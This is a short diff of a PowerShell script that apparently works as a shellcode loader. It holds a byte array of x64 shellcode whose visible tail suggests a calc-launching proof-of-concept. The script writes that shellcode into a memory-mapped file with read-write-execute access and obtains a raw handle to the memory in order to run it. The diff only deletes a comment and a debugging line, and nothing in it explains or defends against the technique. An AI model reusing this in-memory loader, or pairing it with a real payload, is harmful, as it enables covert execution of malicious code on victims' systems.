@@ -55,7 +55,6 @@ $shellcodeadd =  [byte[]] @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x
                             0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
 $shellcode += $shellcodeadd
 #Add RET to attempt to prevent Powershell from crashing when exiting
-#Need to find current EIP and place that at the end of current shellcode with a RET call... potentially.
 $shellcode += [byte[]]@(0xC3)
 
 [System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcodeadd.length,
@@ -63,7 +62,6 @@ $shellcode += [byte[]]@(0xC3)
 [System.IO.MemoryMappedFiles.MemoryMappedFileSecurity]::new(), [System.IO.HandleInheritability]::Inheritable)
 $view = $mmfml.CreateViewStream(0,0)
 $view.Write($shellcode, 0,$shellcode.length)
-$t = New-Object System.IO.StreamReader($view) #debugging so i can check contents of stream without using $view.basestream.readtoend()
 $view.Position = 0
 $acc = $mmfml.CreateViewAccessor(0,0, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
 $memhandle = $acc.SafeMemoryMappedViewHandle.DangerousGetHandle()
